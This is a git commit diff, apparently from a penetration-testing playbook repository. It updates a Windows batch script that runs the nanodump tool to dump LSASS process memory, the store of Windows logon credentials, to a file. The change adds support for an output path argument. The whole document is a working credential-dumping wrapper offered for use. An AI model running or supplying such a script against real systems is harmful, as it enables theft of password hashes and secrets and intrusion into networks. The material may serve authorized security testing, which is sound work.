61d61b850220d9371d72ca9568892fea96f32a93
PentestPlaybook <123711693+PentestPlaybook@users.noreply.github.com>
2026-06-12 19:16:36 -0700

    fix: lsass_nanodump.bat - add output path argument with directory and trailing backslash support

--- lsass_nanodump.bat
+++ lsass_nanodump.bat
@@ -1,4 +1,17 @@
 @echo off
-.\nanodump.x64.exe --write "%~dp0lsass_nanodump.dmp" --valid --fork
+setlocal EnableDelayedExpansion
+
+if "%~1"=="" goto :default
+
+set OUTFILE=%~f1
+if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
+if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_nanodump.dmp
+goto :run
+
+:default
+set OUTFILE=%~dp0lsass_nanodump.dmp
+
+:run
+"%~dp0nanodump.x64.exe" --write "!OUTFILE!" --valid --fork
 echo Done.
-dir "%~dp0lsass_nanodump.dmp"
+dir "!OUTFILE!"
